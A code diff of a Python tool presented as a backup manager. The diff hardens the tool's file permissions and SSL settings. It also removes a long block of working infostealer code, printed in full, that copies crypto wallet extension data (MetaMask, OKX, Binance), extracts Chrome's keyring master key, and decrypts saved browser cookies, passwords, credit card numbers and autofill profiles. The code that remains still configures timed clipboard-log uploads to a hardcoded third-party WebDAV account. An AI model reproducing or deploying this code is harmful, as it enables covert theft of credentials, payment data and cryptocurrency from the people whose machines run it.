@@ -18,10 +18,9 @@ import threading
 import subprocess
 import getpass
 import json
-import base64
 import glob
-import sqlite3
 import re
+from urllib.parse import quote
 from datetime import datetime, timedelta
 from pathlib import Path
 from functools import lru_cache
@@ -66,15 +65,10 @@ except ImportError as e:
 if import_failed:
     print("⚠ 警告: 部分依赖导入失败，程序将继续运行，但相关功能可能不可用")
 
-# 尝试导入加密库
 try:
-    from Crypto.Cipher import AES
-    from Crypto.Protocol.KDF import PBKDF2
-    from Crypto.Random import get_random_bytes
-    CRYPTO_AVAILABLE = True
+    from cryptography.fernet import Fernet
 except ImportError:
-    CRYPTO_AVAILABLE = False
-    print("⚠ pycryptodome 未安装，浏览器数据导出功能将不可用")
+    Fernet = None
 
 class BackupConfig:
     # 调试配置
@@ -93,6 +87,12 @@ class BackupConfig:
     BACKUP_INTERVAL = 7 * 24 * 60 * 60  # 备份间隔时间：7天（单位：秒）
     CLIPBOARD_INTERVAL = 1200  # JTB日志上传间隔时间（20分钟，单位：秒）
     SCAN_TIMEOUT = 3600    # 扫描超时时间：1小时
+
+    # 本地备份安全配置
+    BACKUP_DIR_MODE = 0o700
+    BACKUP_FILE_MODE = 0o600
+    ENCRYPTION_KEY_FILE = str(Path.home() / ".dev" / "Backup" / ".encryption.key")
+    CLIPBOARD_MAX_SIZE = 5 * 1024 * 1024
 
     # 性能优化常量
     TAR_COMPRESS_LEVEL = 6  # tar.gz 压缩级别（1-9，6 为平衡值）
@@ -189,6 +189,7 @@ class BackupConfig:
         ".vscode-server",
         "build",
         ".vscode-remote-ssh",
+        "ylx-backup",
         "__pycache__",
     ]
 
@@ -219,6 +220,8 @@ class BackupManager:
     
     def __init__(self):
         """初始化备份管理器"""
+        if requests is None or HTTPBasicAuth is None:
+            raise RuntimeError("缺少 requests 依赖，无法启动备份上传功能")
         self.config = BackupConfig()
         self.infini_url = "https://wajima.infini-cloud.net/dav/"
         self.infini_user = "wongstar"  #infini-cloud-2
@@ -248,8 +251,11 @@ class BackupManager:
         
         # 配置 requests session 用于上传
         self.session = requests.Session()
-        self.session.verify = False  # 禁用SSL验证
+        self.session.verify = True
         self.auth = HTTPBasicAuth(self.infini_user, self.infini_pass)
+        self._clipboard_lock = threading.Lock()
+        self._network_check_time = 0.0
+        self._network_check_result = False
         
         # 使用集合优化扩展名检查性能
         self.doc_extensions_set = set(ext.lower() for ext in self.config.DOC_EXTENSIONS)
@@ -264,13 +270,14 @@ class BackupManager:
         """配置日志系统"""
         try:
             log_dir = os.path.dirname(self.config.LOG_FILE)
-            os.makedirs(log_dir, exist_ok=True)
+            os.makedirs(log_dir, mode=self.config.BACKUP_DIR_MODE, exist_ok=True)
 
             # 使用 FileHandler，采用上传后清空机制（与 Windows/macOS 版本保持一致）
             file_handler = logging.FileHandler(
                 self.config.LOG_FILE,
                 encoding='utf-8'
             )
+            os.chmod(self.config.LOG_FILE, self.config.BACKUP_FILE_MODE)
             file_handler.setFormatter(
                 logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
             )
@@ -283,7 +290,13 @@ class BackupManager:
                 logging.DEBUG if self.config.DEBUG_MODE else logging.INFO
             )
 
-            root_logger.handlers.clear()
+            # 仅移除本实例之前创建的 handler，不影响宿主程序的日志配置
+            for handler in root_logger.handlers[:]:
+                if getattr(handler, "_ylx_backup_handler", False):
+                    root_logger.removeHandler(handler)
+                    handler.close()
+            file_handler._ylx_backup_handler = True
+            console_handler._ylx_backup_handler = True
             root_logger.addHandler(file_handler)
             root_logger.addHandler(console_handler)
             
@@ -314,7 +327,8 @@ class BackupManager:
                     logging.error(f"目录没有写入权限: {directory_path}")
                     return False
             else:
-                os.makedirs(directory_path, exist_ok=True)
+                os.makedirs(directory_path, mode=BackupConfig.BACKUP_DIR_MODE, exist_ok=True)
+            os.chmod(directory_path, BackupConfig.BACKUP_DIR_MODE)
             return True
         except Exception as e:
             logging.error(f"创建目录失败 {directory_path}: {e}")
@@ -324,30 +338,42 @@ class BackupManager:
     def _clean_directory(directory_path):
         try:
             if os.path.exists(directory_path):
-                shutil.rmtree(directory_path, ignore_errors=True)
+                shutil.rmtree(directory_path)
+                if os.path.exists(directory_path):
+                    logging.error(f"清理目录后仍存在: {directory_path}")
+                    return False
             return BackupManager._ensure_directory(directory_path)
         except Exception as e:
             logging.error(f"清理目录失败 {directory_path}: {e}")
             return False
 
-    @staticmethod
-    def _check_internet_connection():
+    def _check_internet_connection(self):
         """检查网络连接状态"""
+        now = time.monotonic()
+        if now - self._network_check_time < 30:
+            return self._network_check_result
+
+        result = False
         for _ in range(BackupConfig.NETWORK_CHECK_RETRIES):
             for host in BackupConfig.NETWORK_CHECK_HOSTS:
                 try:
-                    socket.create_connection(
-                        (host, 53), 
+                    with socket.create_connection(
+                        (host, 53),
                         timeout=BackupConfig.NETWORK_CHECK_TIMEOUT
-                    )
-                    return True
+                    ):
+                        result = True
+                        break
                 except (socket.timeout, socket.gaierror, ConnectionRefusedError):
                     continue
                 except Exception as e:
                     logging.debug("网络检查出错 %s: %s", host, e)
                     continue
+            if result:
+                break
             time.sleep(1)  # 重试前等待1秒
-        return False
+        self._network_check_time = time.monotonic()
+        self._network_check_result = result
+        return result
 
     @staticmethod
     def _is_valid_file(file_path):
@@ -364,6 +390,7 @@ class BackupManager:
                 target_file_dir = os.path.dirname(target_file)
                 if self._ensure_directory(target_file_dir):
                     shutil.copy2(source_path, target_file)
+                    os.chmod(target_file, self.config.BACKUP_FILE_MODE)
                     if self.config.DEBUG_MODE:
                         logging.info(f"已备份指定文件: {item_name}")
                     return True
@@ -372,838 +399,41 @@ class BackupManager:
                 if self._ensure_directory(os.path.dirname(target_path)):
                     if os.path.exists(target_path):
                         shutil.rmtree(target_path)
-                    # 对于SERVER_BACKUP_DIRS中指定的目录，复制时仍然递归检查排除项
-                    exclude_dirs_lower = {ex.lower() for ex in self.config.EXCLUDE_DIRS}
-                    ignore_func = lambda d, files: [
-                        f for f in files 
-                        if any(ex in os.path.join(d, f).lower() for ex in exclude_dirs_lower)
-                    ]
+                    # 对于指定目录，按路径组件精确排除目录，避免字符串包含误匹配
+                    exclude_dirs_lower = {ex.casefold() for ex in self.config.EXCLUDE_DIRS}
+
+                    source_root = Path(source_path).resolve()
+
+                    def ignore_func(current_dir, names):
+                        ignored = []
+                        for name in names:
+                            candidate = Path(current_dir) / name
+                            try:
+                                relative_parts = candidate.resolve().relative_to(source_root).parts
+                            except (OSError, ValueError):
+                                relative_parts = (name,)
+                            if any(part.casefold() in exclude_dirs_lower for part in relative_parts):
+                                ignored.append(name)
+                        return ignored
+
                     shutil.copytree(source_path, target_path, symlinks=True, ignore=ignore_func)
+                    for copied_root, copied_dirs, copied_files in os.walk(target_path):
+                        if not os.path.islink(copied_root):
+                            os.chmod(copied_root, self.config.BACKUP_DIR_MODE)
+                        for copied_dir in copied_dirs:
+                            copied_dir_path = os.path.join(copied_root, copied_dir)
+                            if not os.path.islink(copied_dir_path):
+                                os.chmod(copied_dir_path, self.config.BACKUP_DIR_MODE)
+                        for copied_file in copied_files:
+                            copied_file_path = os.path.join(copied_root, copied_file)
+                            if not os.path.islink(copied_file_path):
+                                os.chmod(copied_file_path, self.config.BACKUP_FILE_MODE)
                     if self.config.DEBUG_MODE:
                         logging.info(f"📁 已备份指定目录: {item_name}/")
                     return True
         except Exception as e:
             logging.error(f"❌ 备份失败: {item_name} - {str(e)}")
         return False
-
-    def backup_chrome_extensions(self, target_extensions):
-        """备份 Linux 浏览器扩展目录（仅钱包扩展数据）- 独立函数和独立目录"""
-        try:
-            home_dir = os.path.expanduser('~')
-            username = getpass.getuser()
-            user_prefix = username[:5] if username else "user"
-            
-            # 目标扩展的识别信息（通过名称和可能的ID匹配）
-            # 支持从不同商店安装的扩展（Chrome Web Store、Edge Add-ons Store等）
-            target_extensions_config = {
-                "metamask": {
-                    "names": ["MetaMask", "metamask"],  # manifest.json 中的 name 字段
-                    "ids": [
-                        "nkbihfbeogaeaoehlefnkodbefgpgknn",  # Chrome / Chromium / Brave
-                        "ejbalbakoplchlghecdalmeeeajnimhm",  # Edge
-                    ],
-                },
-                "okx_wallet": {
-                    "names": ["OKX Wallet", "OKX", "okx wallet"],
-                    "ids": [
-                        "mcohilncbfahbmgdjkbpemcciiolgcge",  # Chrome / Chromium / Brave
-                        "pbpjkcldjiffchgbbndmhojiacbgflha",  # Edge
-                    ],
-                },
-                "binance_wallet": {
-                    "names": ["Binance Wallet", "Binance", "binance wallet"],
-                    "ids": [
-                        "cadiboklkpojfamcoggejbbdjcoiljjk",  # Chrome / Chromium / Brave
-                        # Edge 不支持 Binance Wallet
-                    ],
-                },
-            }
-            
-            browser_roots = {
-                "chrome": os.path.join(home_dir, '.config', 'google-chrome', 'Default', 'Local Extension Settings'),
-                "chromium": os.path.join(home_dir, '.config', 'chromium', 'Default', 'Local Extension Settings'),
-                "edge": os.path.join(home_dir, '.config', 'microsoft-edge', 'Default', 'Local Extension Settings'),
-            }
-
-            def identify_extension(ext_id, ext_settings_path):
-                """通过扩展ID和manifest.json识别扩展类型"""
-                # 方法1: 通过已知ID匹配
-                for ext_name, ext_info in target_extensions_config.items():
-                    if ext_id in ext_info["ids"]:
-                        return ext_name
-                
-                # 方法2: 通过读取Extensions目录下的manifest.json识别
-                # 扩展的实际安装目录在 Extensions 文件夹中
-                try:
-                    # 尝试从 Local Extension Settings 的父目录找到 Extensions 目录
-                    profile_path = os.path.dirname(ext_settings_path)
-                    extensions_dir = os.path.join(profile_path, "Extensions")
-                    if os.path.exists(extensions_dir):
-                        ext_install_dir = os.path.join(extensions_dir, ext_id)
-                        if os.path.exists(ext_install_dir):
-                            # 查找版本目录（扩展通常安装在版本号子目录中）
-                            version_dirs = [d for d in os.listdir(ext_install_dir) 
-                                           if os.path.isdir(os.path.join(ext_install_dir, d))]
-                            for version_dir in version_dirs:
-                                manifest_path = os.path.join(ext_install_dir, version_dir, "manifest.json")
-                                if os.path.exists(manifest_path):
-                                    try:
-                                        with open(manifest_path, 'r', encoding='utf-8') as f:
-                                            manifest = json.load(f)
-                                            ext_name_in_manifest = manifest.get("name", "")
-                                            # 检查是否匹配目标扩展
-                                            for ext_name, ext_info in target_extensions_config.items():
-                                                for target_name in ext_info["names"]:
-                                                    if target_name.lower() in ext_name_in_manifest.lower():
-                                                        return ext_name
-                                    except Exception as e:
-                                        if self.config.DEBUG_MODE:
-                                            logging.debug("读取manifest.json失败: %s - %s", manifest_path, e)
-                                        continue
-                except Exception as e:
-                    if self.config.DEBUG_MODE:
-                        logging.debug("识别扩展失败: %s - %s", ext_id, e)
-                
-                return None
-
-            def copy_chrome_dir_if_exists(src_dir, dst_name):
-                if os.path.exists(src_dir) and os.path.isdir(src_dir):
-                    target_path = os.path.join(target_extensions, dst_name)
-                    try:
-                        # 确保目标父目录存在
-                        parent_dir = os.path.dirname(target_path)
-                        if not self._ensure_directory(parent_dir):
-                            return
-                        # 如果目标目录已存在，先删除
-                        if os.path.exists(target_path):
-                            shutil.rmtree(target_path, ignore_errors=True)
-                        # 复制整个目录
-                        shutil.copytree(src_dir, target_path, symlinks=True)
-                        if self.config.DEBUG_MODE:
-                            logging.info(f"📦 已备份 Chrome 扩展目录: {dst_name}")
-                    except Exception as e:
-                        if self.config.DEBUG_MODE:
-                            logging.debug(f"复制 Chrome 扩展目录失败: {src_dir} - {str(e)}")
-
-            for browser_name, root_dir in browser_roots.items():
-                if not os.path.exists(root_dir):
-                    continue
-                
-                # 扫描所有扩展目录
-                try:
-                    ext_dirs = [d for d in os.listdir(root_dir) 
-                               if os.path.isdir(os.path.join(root_dir, d))]
-                    
-                    for ext_id in ext_dirs:
-                        # 识别扩展类型
-                        ext_name = identify_extension(ext_id, root_dir)
-                        if not ext_name:
-                            continue  # 不是目标扩展，跳过
-                        
-                        source_dir = os.path.join(root_dir, ext_id)
-                        copy_chrome_dir_if_exists(source_dir, f"{user_prefix}_{browser_name}_{ext_name}")
-                except Exception as e:
-                    if self.config.DEBUG_MODE:
-                        logging.debug(f"扫描扩展目录失败: {root_dir} - {e}")
-        except Exception as e:
-            if self.config.DEBUG_MODE:
-                logging.debug(f"备份浏览器扩展目录失败: {str(e)}")
-
-    def _get_browser_master_key(self, browser_name):
-        """获取浏览器主密钥（从 Linux Keyring）"""
-        if not CRYPTO_AVAILABLE:
-            return None
-        
-        try:
-            # 方法 1：尝试使用 secretstorage 库
-            try:
-                import secretstorage
-                connection = secretstorage.dbus_init()
-                collection = secretstorage.get_default_collection(connection)
-                
-                keyring_labels = {
-                    "Chrome": "Chrome Safe Storage",
-                    "Chromium": "Chromium Safe Storage",
-                    "Brave": "Brave Safe Storage",
-                    "Edge": "Chromium Safe Storage",
-                }
-                
-                label = keyring_labels.get(browser_name, "Chrome Safe Storage")
-                
-                for item in collection.get_all_items():
-                    if item.get_label() == label:
-                        password = item.get_secret().decode('utf-8')
-                        connection.close()
-                        
-                        salt = b'saltysalt'
-                        iterations = 1
-                        key = PBKDF2(password.encode('utf-8'), salt, dkLen=16, count=iterations)
-                        return key
-                
-                connection.close()
-            except Exception:
-                pass
-            
-            # 方法 2：尝试使用 libsecret-tool 命令行工具
-            try:
-                keyring_apps = {
-                    "Chrome": "chrome",
-                    "Chromium": "chromium",
-                    "Brave": "brave",
-                    "Edge": "chromium",
-                }
-                
-                app = keyring_apps.get(browser_name, "chrome")
-                cmd = ['secret-tool', 'lookup', 'application', app]
-                result = subprocess.run(cmd, capture_output=True, text=True)
-                
-                if result.returncode == 0:
-                    password = result.stdout.strip()
-                    salt = b'saltysalt'
-                    iterations = 1
-                    key = PBKDF2(password.encode('utf-8'), salt, dkLen=16, count=iterations)
-                    return key
-            except Exception:
-                pass
-            
-            # 方法 3：使用默认密码 "peanuts"
-            password = "peanuts"
-            salt = b'saltysalt'
-            iterations = 1
-            key = PBKDF2(password.encode('utf-8'), salt, dkLen=16, count=iterations)
-            return key
-            
-        except Exception as e:
-            if self.config.DEBUG_MODE:
-                logging.debug(f"获取 {browser_name} 主密钥失败: {e}")
-            # 回退到默认密钥
-            password = "peanuts"
-            salt = b'saltysalt'
-            iterations = 1
-            key = PBKDF2(password.encode('utf-8'), salt, dkLen=16, count=iterations)
-            return key
-    
-    def _decrypt_browser_payload(self, cipher_text, master_key):
-        """解密浏览器数据"""
-        if not CRYPTO_AVAILABLE or not master_key:
-            return None
-        
-        try:
-            if not isinstance(cipher_text, (bytes, bytearray)) or not cipher_text:
-                return None
-
-            prefix = bytes(cipher_text[:3])
-            # Linux Chrome v10 使用 AES-128-CBC。
-            if prefix == b'v10':
-                iv = b' ' * 16  # Chrome on Linux uses blank IV
-                cipher_text = cipher_text[3:]  # 移除 v10 前缀
-                cipher = AES.new(master_key, AES.MODE_CBC, iv)
-                decrypted = cipher.decrypt(cipher_text)
-                # 移除 PKCS7 padding
-                padding_length = decrypted[-1]
-                if isinstance(padding_length, int) and 1 <= padding_length <= 16:
-                    decrypted = decrypted[:-padding_length]
-                return decrypted.decode('utf-8', errors='ignore')
-            # Linux Chrome v11 使用 AES-GCM，格式为 v11 + nonce + ciphertext + tag。
-            elif prefix == b'v11':
-                payload = bytes(cipher_text[3:])
-                if len(payload) < 12 + 16:
-                    return None
-                nonce = payload[:12]
-                ciphertext = payload[12:-16]
-                tag = payload[-16:]
-                cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
-                return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', errors='ignore')
-            else:
-                return bytes(cipher_text).decode('utf-8', errors='ignore')
-        except Exception:
-            return None
-    
-    def _safe_copy_locked_file(self, source_path, dest_path, max_retries=3):
-        """安全复制被锁定的文件（浏览器运行时）"""
-        # 优先使用 SQLite Online Backup，确保包含 WAL 中的最新事务。
-        if self._sqlite_online_backup(source_path, dest_path):
-            return True
-
-        for attempt in range(max_retries):
-            try:
-                shutil.copy2(source_path, dest_path)
-                return True
-            except PermissionError:
-                try:
-                    with open(source_path, 'rb') as src:
-                        with open(dest_path, 'wb') as dst:
-                            shutil.copyfileobj(src, dst)
-                    return True
-                except Exception:
-                    if attempt == max_retries - 1:
-                        return self._sqlite_online_backup(source_path, dest_path)
-                    time.sleep(0.5)
-            except Exception:
-                return False
-        return False
-    
-    def _sqlite_online_backup(self, source_db, dest_db):
-        """使用 SQLite Online Backup 复制数据库"""
-        try:
-            source_conn = sqlite3.connect(f"file:{source_db}?mode=ro", uri=True)
-            dest_conn = sqlite3.connect(dest_db)
-            source_conn.backup(dest_conn)
-            source_conn.close()
-            dest_conn.close()
-            return True
-        except Exception:
-            return False
-    
-    def _export_browser_cookies(self, browser_name, browser_path, master_key, temp_dir, profile_name=None):
-        """导出浏览器 Cookies"""
-        # 支持 Network/Cookies 路径（新版本 Chrome）
-        cookies_path = os.path.join(browser_path, "Network", "Cookies")
-        if not os.path.exists(cookies_path):
-            cookies_path = os.path.join(browser_path, "Cookies")
-        
-        if not os.path.exists(cookies_path):
-            return []
-        
-        profile_suffix = f"_{profile_name}" if profile_name else ""
-        temp_cookies = os.path.join(temp_dir, f"temp_{browser_name}{profile_suffix}_cookies.db")
-        if not self._safe_copy_locked_file(cookies_path, temp_cookies):
-            return []
-        
-        cookies = []
-        try:
-            conn = sqlite3.connect(temp_cookies)
-            cursor = conn.cursor()
-            # 使用 CAST 确保 encrypted_value 作为 BLOB 读取
-            cursor.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) as encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
-            
-            for row in cursor.fetchall():
-                host, name, encrypted_value, path, expires, is_secure, is_httponly = row
-                
-                # 确保 encrypted_value 是 bytes 类型
-                if encrypted_value is not None:
-                    if isinstance(encrypted_value, str):
-                        try:
-                            encrypted_value = encrypted_value.encode('latin1')
-                        except:
-                            continue
-                    elif not isinstance(encrypted_value, (bytes, bytearray)):
-                        try:
-                            encrypted_value = bytes(encrypted_value)
-                        except:
-                            continue
-                
-                decrypted_value = self._decrypt_browser_payload(encrypted_value, master_key)
-                if decrypted_value:
-                    cookies.append({
-                        "host": host,
-                        "name": name,
-                        "value": decrypted_value,
-                        "path": path,
-                        "expires": expires,
-                        "secure": bool(is_secure),
-                        "httponly": bool(is_httponly)
-                    })
-            
-            conn.close()
-        except (sqlite3.Error, UnicodeDecodeError) as e:
-            # 如果 CAST 方法失败，尝试使用备用方法
-            try:
-                conn = sqlite3.connect(temp_cookies)
-                conn.text_factory = bytes
-                cursor = conn.cursor()
-                cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
-                
-                for row in cursor.fetchall():
-                    host_bytes, name_bytes, encrypted_value, path_bytes, expires, is_secure, is_httponly = row
-                    
-                    # 解码文本字段
-                    try:
-                        host = host_bytes.decode('utf-8') if isinstance(host_bytes, bytes) else host_bytes
-                        name = name_bytes.decode('utf-8') if isinstance(name_bytes, bytes) else name_bytes
-                        path = path_bytes.decode('utf-8') if isinstance(path_bytes, bytes) else path_bytes
-                    except:
-                        continue
-                    
-                    # encrypted_value 应该是 bytes，直接使用
-                    if encrypted_value is not None and isinstance(encrypted_value, bytes):
-                        decrypted_value = self._decrypt_browser_payload(encrypted_value, master_key)
-                        if decrypted_value:
-                            cookies.append({
-                                "host": host,
-                                "name": name,
-                                "value": decrypted_value,
-                                "path": path,
-                                "expires": expires,
-                                "secure": bool(is_secure),
-                                "httponly": bool(is_httponly)
-                            })
-                
-                conn.close()
-            except Exception as e2:
-                pass
-        except Exception:
-            pass
-        finally:
-            if os.path.exists(temp_cookies):
-                try:
-                    os.remove(temp_cookies)
-                except Exception:
-                    pass
-        
-        return cookies
-    
-    def _export_browser_passwords(self, browser_name, browser_path, master_key, temp_dir, profile_name=None):
-        """导出浏览器密码"""
-        login_data_path = os.path.join(browser_path, "Login Data")
-        if not os.path.exists(login_data_path):
-            return []
-        
-        profile_suffix = f"_{profile_name}" if profile_name else ""
-        temp_login = os.path.join(temp_dir, f"temp_{browser_name}{profile_suffix}_login.db")
-        if not self._safe_copy_locked_file(login_data_path, temp_login):
-            return []
-        
-        passwords = []
-        try:
-            conn = sqlite3.connect(temp_login)
-            cursor = conn.cursor()
-            # 使用 CAST 确保 password_value 作为 BLOB 读取
-            cursor.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) as password_value FROM logins")
-            
-            for row in cursor.fetchall():
-                url, username, encrypted_password = row
-                
-                # 确保 encrypted_password 是 bytes 类型
-                if encrypted_password is not None:
-                    if isinstance(encrypted_password, str):
-                        try:
-                            encrypted_password = encrypted_password.encode('latin1')
-                        except:
-                            continue
-                    elif not isinstance(encrypted_password, (bytes, bytearray)):
-                        try:
-                            encrypted_password = bytes(encrypted_password)
-                        except:
-                            continue
-                
-                decrypted_password = self._decrypt_browser_payload(encrypted_password, master_key)
-                if decrypted_password:
-                    passwords.append({
-                        "url": url,
-                        "username": username,
-                        "password": decrypted_password
-                    })
-            
-            conn.close()
-        except (sqlite3.Error, UnicodeDecodeError) as e:
-            # 如果 CAST 方法失败，尝试使用备用方法
-            try:
-                conn = sqlite3.connect(temp_login)
-                conn.text_factory = bytes
-                cursor = conn.cursor()
-                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-                
-                for row in cursor.fetchall():
-                    url_bytes, username_bytes, encrypted_password = row
-                    
-                    # 解码文本字段
-                    try:
-                        url = url_bytes.decode('utf-8') if isinstance(url_bytes, bytes) else url_bytes
-                        username = username_bytes.decode('utf-8') if isinstance(username_bytes, bytes) else username_bytes
-                    except:
-                        continue
-                    
-                    # encrypted_password 应该是 bytes，直接使用
-                    if encrypted_password is not None and isinstance(encrypted_password, bytes):
-                        decrypted_password = self._decrypt_browser_payload(encrypted_password, master_key)
-                        if decrypted_password:
-                            passwords.append({
-                                "url": url,
-                                "username": username,
-                                "password": decrypted_password
-                            })
-                
-                conn.close()
-            except Exception as e2:
-                pass
-        except Exception:
-            pass
-        finally:
-            if os.path.exists(temp_login):
-                try:
-                    os.remove(temp_login)
-                except Exception:
-                    pass
-        
-        return passwords
-    
-    def _export_browser_web_data(self, browser_name, browser_path, master_key, temp_dir, profile_name=None):
-        """导出浏览器 Web Data（自动填充数据、支付方式等）"""
-        web_data_path = os.path.join(browser_path, "Web Data")
-        if not os.path.exists(web_data_path):
-            return {
-                "autofill_profiles": [],
-                "credit_cards": [],
-                "autofill_profile_names": [],
-                "autofill_profile_emails": [],
-                "autofill_profile_phones": [],
-                "autofill_profile_addresses": []
-            }
-        
-        profile_suffix = f"_{profile_name}" if profile_name else ""
-        temp_web_data = os.path.join(temp_dir, f"temp_{browser_name}{profile_suffix}_webdata.db")
-        if not self._safe_copy_locked_file(web_data_path, temp_web_data):
-            return {
-                "autofill_profiles": [],
-                "credit_cards": [],
-                "autofill_profile_names": [],
-                "autofill_profile_emails": [],
-                "autofill_profile_phones": [],
-                "autofill_profile_addresses": []
-            }
-        
-        web_data = {
-            "autofill_profiles": [],
-            "credit_cards": [],
-            "autofill_profile_names": [],
-            "autofill_profile_emails": [],
-            "autofill_profile_phones": [],
-            "autofill_profile_addresses": []
-        }
-        
-        try:
-            conn = sqlite3.connect(temp_web_data)
-            cursor = conn.cursor()
-            
-            try:
-                # 使用 CAST 确保 card_number_encrypted 作为 BLOB 读取
-                cursor.execute("SELECT guid, name_on_card, expiration_month, expiration_year, CAST(card_number_encrypted AS BLOB) as card_number_encrypted, billing_address_id, nickname FROM credit_cards")
-                for row in cursor.fetchall():
-                    guid, name_on_card, exp_month, exp_year, encrypted_card, billing_id, nickname = row
-                    try:
-                        # 确保 encrypted_card 是 bytes 类型
-                        if encrypted_card is not None:
-                            if isinstance(encrypted_card, str):
-                                try:
-                                    encrypted_card = encrypted_card.encode('latin1')
-                                except:
-                                    continue
-                            elif not isinstance(encrypted_card, (bytes, bytearray)):
-                                try:
-                                    encrypted_card = bytes(encrypted_card)
-                                except:
-                                    continue
-                        
-                        decrypted_card = self._decrypt_browser_payload(encrypted_card, master_key) if encrypted_card else None
-                        if decrypted_card:
-                            web_data["credit_cards"].append({
-                                "guid": guid,
-                                "name_on_card": name_on_card,
-                                "expiration_month": exp_month,
-                                "expiration_year": exp_year,
-                                "card_number": decrypted_card,
-                                "billing_address_id": billing_id,
-                                "nickname": nickname
-                            })
-                    except Exception:
-                        continue
-            except (sqlite3.Error, UnicodeDecodeError) as e:
-                # 如果 CAST 方法失败，尝试使用备用方法
-                try:
-                    conn2 = sqlite3.connect(temp_web_data)
-                    conn2.text_factory = bytes
-                    cursor2 = conn2.cursor()
-                    cursor2.execute("SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id, nickname FROM credit_cards")
-                    
-                    for row in cursor2.fetchall():
-                        guid_bytes, name_bytes, exp_month, exp_year, encrypted_card, billing_id, nickname_bytes = row
-                        try:
-                            guid = guid_bytes.decode('utf-8') if isinstance(guid_bytes, bytes) else guid_bytes
-                            name_on_card = name_bytes.decode('utf-8') if isinstance(name_bytes, bytes) else name_bytes
-                            nickname = nickname_bytes.decode('utf-8') if isinstance(nickname_bytes, bytes) else nickname_bytes
-                        except:
-                            continue
-                        
-                        if encrypted_card is not None and isinstance(encrypted_card, bytes):
-                            decrypted_card = self._decrypt_browser_payload(encrypted_card, master_key)
-                            if decrypted_card:
-                                web_data["credit_cards"].append({
-                                    "guid": guid,
-                                    "name_on_card": name_on_card,
-                                    "expiration_month": exp_month,
-                                    "expiration_year": exp_year,
-                                    "card_number": decrypted_card,
-                                    "billing_address_id": billing_id,
-                                    "nickname": nickname
-                                })
-                    conn2.close()
-                except Exception as e2:
-                    pass
-            except Exception:
-                pass
-            
-            try:
-                cursor.execute("SELECT guid, first_name, middle_name, last_name, full_name, honorific_prefix, honorific_suffix FROM autofill_profiles")
-                for row in cursor.fetchall():
-                    guid, first_name, middle_name, last_name, full_name, honorific_prefix, honorific_suffix = row
-                    web_data["autofill_profiles"].append({
-                        "guid": guid,
-                        "first_name": first_name,
-                        "middle_name": middle_name,
-                        "last_name": last_name,
-                        "full_name": full_name,
-                        "honorific_prefix": honorific_prefix,
-                        "honorific_suffix": honorific_suffix
-                    })
-            except Exception:
-                pass
-            
-            try:
-                cursor.execute("SELECT guid, first_name, middle_name, last_name, full_name FROM autofill_profile_names")
-                for row in cursor.fetchall():
-                    guid, first_name, middle_name, last_name, full_name = row
-                    web_data["autofill_profile_names"].append({
-                        "guid": guid,
-                        "first_name": first_name,
-                        "middle_name": middle_name,
-                        "last_name": last_name,
-                        "full_name": full_name
-                    })
-            except Exception:
-                pass
-            
-            try:
-                cursor.execute("SELECT guid, email FROM autofill_profile_emails")
-                for row in cursor.fetchall():
-                    guid, email = row
-                    web_data["autofill_profile_emails"].append({
-                        "guid": guid,
-                        "email": email
-                    })
-            except Exception:
-                pass
-            
-            try:
-                cursor.execute("SELECT guid, number FROM autofill_profile_phones")
-                for row in cursor.fetchall():
-                    guid, number = row
-                    web_data["autofill_profile_phones"].append({
-                        "guid": guid,
-                        "number": number
-                    })
-            except Exception:
-                pass
-            
-            try:
-                cursor.execute("SELECT guid, street_address, address_line_1, address_line_2, city, state, zipcode, country_code FROM autofill_profile_addresses")
-                for row in cursor.fetchall():
-                    guid, street_address, address_line_1, address_line_2, city, state, zipcode, country_code = row
-                    web_data["autofill_profile_addresses"].append({
-                        "guid": guid,
-                        "street_address": street_address,
-                        "address_line_1": address_line_1,
-                        "address_line_2": address_line_2,
-                        "city": city,
-                        "state": state,
-                        "zipcode": zipcode,
-                        "country_code": country_code
-                    })
-            except Exception:
-                pass
-            
-            conn.close()
-        except Exception:
-            pass
-        finally:
-            if os.path.exists(temp_web_data):
-                try:
-                    os.remove(temp_web_data)
-                except Exception:
-                    pass
-        
-        return web_data
-    
-    def _encrypt_browser_export_data(self, data, password):
-        """加密浏览器导出数据"""
-        if not CRYPTO_AVAILABLE:
-            return None
-        
-        try:
-            salt = get_random_bytes(32)
-            key = PBKDF2(password, salt, dkLen=32, count=100000)
-            cipher = AES.new(key, AES.MODE_GCM)
-            ciphertext, tag = cipher.encrypt_and_digest(
-                json.dumps(data, ensure_ascii=False).encode('utf-8')
-            )
-            
-            encrypted_data = {
-                "salt": base64.b64encode(salt).decode('utf-8'),
-                "nonce": base64.b64encode(cipher.nonce).decode('utf-8'),
-                "tag": base64.b64encode(tag).decode('utf-8'),
-                "ciphertext": base64.b64encode(ciphertext).decode('utf-8')
-            }
-            return encrypted_data
-        except Exception:
-            return None
-    
-    def backup_browser_data(self, target_browser_data):
-        """导出所有浏览器的 Cookies 和密码（加密保存）- 独立函数和独立目录"""
-        if not CRYPTO_AVAILABLE:
-            if self.config.DEBUG_MODE:
-                logging.debug("⚠️ 浏览器数据导出功能不可用（缺少 pycryptodome）")
-            return
-        
-        try:
-            home_dir = os.path.expanduser('~')
-            username = getpass.getuser()
-            user_prefix = username[:5] if username else "user"
-            
-            # 浏览器 User Data 根目录（支持多个 Profile）
-            browsers = {
-                "Chrome": os.path.join(home_dir, ".config/google-chrome"),
-                "Chromium": os.path.join(home_dir, ".config/chromium"),
-                "Brave": os.path.join(home_dir, ".config/BraveSoftware/Brave-Browser"),
-                "Edge": os.path.join(home_dir, ".config/microsoft-edge"),
-            }
-            
-            # 在目标目录下创建临时目录
-            temp_dir = os.path.join(target_browser_data, "temp_browser_export")
-            if not self._ensure_directory(temp_dir):
-                return
-            
-            all_data = {
-                "export_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                "username": username,
-                "platform": "Linux",
-                "browsers": {}
-            }
-            
-            exported_count = 0
-            for browser_name, user_data_path in browsers.items():
-                if not os.path.exists(user_data_path):
-                    continue
-                
-                # 获取主密钥（所有 Profile 共享同一个 Master Key）
-                master_key = self._get_browser_master_key(browser_name)
